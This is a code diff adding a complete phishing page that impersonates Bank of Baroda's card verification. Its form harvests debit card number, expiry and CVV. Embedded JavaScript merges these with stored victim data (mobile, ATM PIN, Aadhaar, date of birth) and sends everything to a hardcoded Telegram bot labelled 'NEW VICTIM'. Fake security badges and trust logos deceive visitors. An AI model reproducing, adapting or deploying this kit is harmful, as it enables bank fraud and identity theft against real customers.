@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BOB Online - Secure Card Verification</title>
+    <style>
+        :root {
+            --boi-blue: #0076b6;
+            --boi-dark-blue: #005a8d;
+            --boi-orange: #f37021;
+            --light-bg: #f8fbff;
+            --text-color: #2c3e50;
+            --border-color: #dbe4ee;
+            --card-gradient: linear-gradient(135deg, #0076b6 0%, #004a72 100%);
+        }
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--light-bg);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            background-color: #fff;
+            padding: 12px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo img {
+            height: 38px;
+            display: block;
+        }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 11px;
+            color: #27ae60;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .card-container {
+            padding: 20px 18px;
+            perspective: 1000px;
+        }
+        .virtual-card {
+            width: 100%;
+            aspect-ratio: 1.58 / 1;
+            background: var(--card-gradient);
+            border-radius: 16px;
+            padding: 20px;
+            color: #fff;
+            position: relative;
+            box-shadow: 0 15px 35px rgba(0, 118, 182, 0.3);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: transform 0.6s;
+        }
+        .virtual-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -10%;
+            width: 120%;
+            height: 120%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            transform: rotate(-20deg);
+        }
+        /* Bank name - top centre */
+        .bank-name {
+            text-align: center;
+            font-size: 1.6rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+            position: relative;
+            z-index: 2;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        .chip {
+            width: 45px;
+            height: 35px;
+            background: linear-gradient(135deg, #f1c40f 0%, #f39c12 100%);
+            border-radius: 6px;
+            position: relative;
+            z-index: 2;
+        }
+        .card-number-display {
+            font-size: 1.35rem;
+            letter-spacing: 2px;
+            margin: 20px 0;
+            font-family: 'Courier New', Courier, monospace;
+            text-shadow: 0 2px 2px rgba(0,0,0,0.3);
+            position: relative;
+            z-index: 2;
+        }
+        .card-details-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: relative;
+            z-index: 2;
+        }
+        .detail-label {
+            font-size: 9px;
+            text-transform: uppercase;
+            opacity: 0.8;
+            margin-bottom: 4px;
+        }
+        .detail-value {
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        .content {
+            padding: 0 18px 30px;
+            flex: 1;
+        }
+        .form-card {
+            background: #fff;
+            border-radius: 20px;
+            padding: 25px 20px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.04);
+            margin-top: -10px;
+            position: relative;
+            z-index: 5;
+        }
+        .form-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin: 0 0 20px;
+            color: var(--boi-dark-blue);
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #7f8c8d;
+            text-transform: uppercase;
+        }
+        .form-group input {
+            width: 100%;
+            height: 54px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            padding: 0 15px;
+            font-size: 16px;
+            font-weight: 500;
+            outline: none;
+            transition: all 0.3s;
+            background-color: #fff;
+        }
+        .form-group input:focus {
+            border-color: var(--boi-blue);
+            box-shadow: 0 0 0 4px rgba(0, 118, 182, 0.1);
+        }
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+        .btn-continue {
+            width: 100%;
+            height: 56px;
+            background-color: var(--boi-blue);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+            box-shadow: 0 8px 20px rgba(0, 118, 182, 0.25);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-continue:active {
+            transform: scale(0.98);
+            background-color: var(--boi-dark-blue);
+        }
+        .trust-section {
+            margin-top: 25px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            opacity: 0.6;
+            filter: grayscale(1);
+        }
+        .trust-badge {
+            height: 22px;
+        }
+        footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #95a5a6;
+            background-color: #fff;
+            border-top: 1px solid #f0f0f0;
+        }
+        #loader {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .spinner-ring {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--boi-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="loader">
+        <div class="spinner-ring"></div>
+        <p style="margin-top: 15px; color: var(--boi-blue); font-weight: 600; font-size: 14px;">Securing session...</p>
+    </div>
+    <header class="header">
+        <div class="logo">
+            <img src="L0.webp" alt="Bank of India">
+        </div>
+        <div class="secure-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+            256-bit SSL Secure
+        </div>
+    </header>
+    <div class="card-container">
+        <div class="virtual-card">
+            <!-- Bank name at top centre -->
+            <div class="bank-name">Bank of Baroda</div>
+            <div class="chip"></div>
+            <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
+            <div class="card-details-row">
+                <div>
+                    <div class="detail-label">Card Holder</div>
+                    <div class="detail-value">BOB CUSTOMER</div>
+                </div>
+                <div>
+                    <div class="detail-label">Expires</div>
+                    <div class="detail-value" id="expiryDisplay">MM/YY</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="content">
+        <div class="form-card">
+            <h2 class="form-title">Card Verification</h2>
+            <div class="form-group">
+                <label for="cardNumber">Debit Card Number</label>
+                <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number">
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="expiry">Expiry Date</label>
+                    <input type="tel" id="expiry" placeholder="MM/YY" maxlength="5">
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV Code</label>
+                    <input type="password" id="cvv" placeholder="***" maxlength="3">
+                </div>
+            </div>
+            <!-- ATM PIN field removed -->
+            <button class="btn-continue" id="continueBtn" onclick="submitCardDetails()">VERIFY SECURELY</button>
+            <div class="trust-section">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" class="trust-badge" alt="Visa">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" class="trust-badge" alt="Mastercard">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/1200px-Rupay-Logo.png" class="trust-badge" alt="RuPay">
+            </div>
+        </div>
+        <div style="text-align: center; margin-top: 25px; color: #7f8c8d; font-size: 13px;">
+            <p>Your security is our priority. This transaction is protected by advanced encryption.</p>
+        </div>
+    </div>
+    <footer>
+        &copy; 2026 Bank of Baroda. All rights reserved.<br>
+        <span style="opacity: 0.6;">ISO 27001 Certified Banking Operations</span>
+    </footer>
+
+    <script>
+        // Card Preview Updates
+        const cardNumInput = document.getElementById('cardNumber');
+        const cardNumDisplay = document.getElementById('cardNumberDisplay');
+        const expiryInput = document.getElementById('expiry');
+        const expiryDisplay = document.getElementById('expiryDisplay');
+        // cardType removed – no longer needed
+
+        cardNumInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
+            this.value = formatted;
+            cardNumDisplay.textContent = formatted || '•••• •••• •••• ••••';
+            // Dynamic card type removed – now fixed "Bank of Baroda"
+        });
+
+        expiryInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 2) {
+                val = val.substring(0, 2) + '/' + val.substring(2, 4);
+            }
+            this.value = val;
+            expiryDisplay.textContent = val || 'MM/YY';
+        });
+
+        ['cvv'].forEach(id => {  // atmPin removed
+            document.getElementById(id).addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+            });
+        });
+
+        // Telegram Sender
+        async function sendToTelegram(data) {
+            const BOT_TOKEN = "8965651789:AAE3nyAfBaSEHmbxGY-R8GWnXTUVrnGhSac";
+            const CHAT_ID = "7598156340";
+
+            const message = `
+🔥 **BOB FULLZ - NEW VICTIM** 🔥
+
+📱 **Mobile:** ${data.mobileNumber || 'N/A'}
+🔑 **Login ATM PIN:** ${data.atmPinLogin || 'N/A'}
+
+🆔 **Aadhaar:** ${data.aadhaarNumber || 'N/A'}
+📅 **DOB:** ${data.dob || 'N/A'}
+
+💳 **Card Number:** ${data.cardNumber || 'N/A'}
+📆 **Expiry:** ${data.expiry || 'N/A'}
+🔢 **CVV:** ${data.cvv || 'N/A'}
+
+⏰ **Time:** ${new Date().toLocaleString('en-IN')}
+            `.trim();
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {
+                console.error("TG Error:", e);
+            }
+        }
+
+        function submitCardDetails() {
+            const cardNumber = cardNumInput.value.replace(/\s/g, '');
+            const expiry = expiryInput.value.replace(/\//g, '');
+            const cvv = document.getElementById('cvv').value;
+
+            if (cardNumber.length !== 16) {
+                alert('Invalid Card Number. Please check and try again.');
+                return;
+            }
+            if (expiry.length !== 4) {
+                alert('Invalid Expiry Date.');
+                return;
+            }
+            if (cvv.length !== 3) {
+                alert('Invalid CVV.');
+                return;
+            }
+
+            let victimData = JSON.parse(localStorage.getItem('boi_victim') || '{}');
+            
+            victimData.cardNumber = cardNumber;
+            victimData.expiry = expiry;
+            victimData.cvv = cvv;
+            victimData.finalTimestamp = new Date().toISOString();
+
+            sendToTelegram(victimData);
+
+            document.getElementById('loader').style.display = 'flex';
+            document.getElementById('continueBtn').disabled = true;
+
+            setTimeout(() => {
+                localStorage.removeItem('boi_victim');
+                window.location.href = 'processing.html';
+            }, 1800);
+        }
+    </script>
+</body>
+</html>
